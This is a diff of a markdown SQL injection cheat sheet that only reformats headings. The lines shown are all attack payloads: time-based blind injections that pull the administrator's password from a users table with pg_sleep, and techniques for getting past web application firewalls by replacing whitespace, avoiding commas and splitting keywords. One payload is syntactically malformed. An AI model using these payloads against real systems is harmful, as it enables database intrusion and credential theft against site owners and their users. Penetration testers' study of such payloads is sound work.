@@ -186,10 +186,10 @@ xyz'|| (case when (substr((select password from users where username='administra
 hvdhjv’; select when ((ascii(substring(select password from <table_name> where username='admin'),1,1))>100) then pg_sleep(10) else pg_sleep(0) end ;
 ```
 
+
 ## WAF Bypasses
 
-#### Avoiding the White Space
-Using alternatives of white spaces
+- Avoiding the White Space
 ```sql
 '/**/or/**/1=1;--
 
@@ -201,11 +201,11 @@ Using alternatives of white spaces
 
 '%A0and%A01=1;--
 ```
-#### Parenthesis
+- Parenthesis
 ```sql
 id=(1)or(1)=(1)
 ```
-#### No Comma allowed
+- No Comma allowed
 ```sql
 LIMIT 0,1  ==>  LIMIT 0 OFFSET 1
 
@@ -213,7 +213,7 @@ SUBSTRING('hello world', 1, 1)  ==>  SUBSTRING('hello world' FROM 1 FOR 1)
 
 SELECT 1,2,3,4  ==>	UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
-#### Others
+- Others
 ```
 'ad'||'min'  is equal to 'admin'
 ```
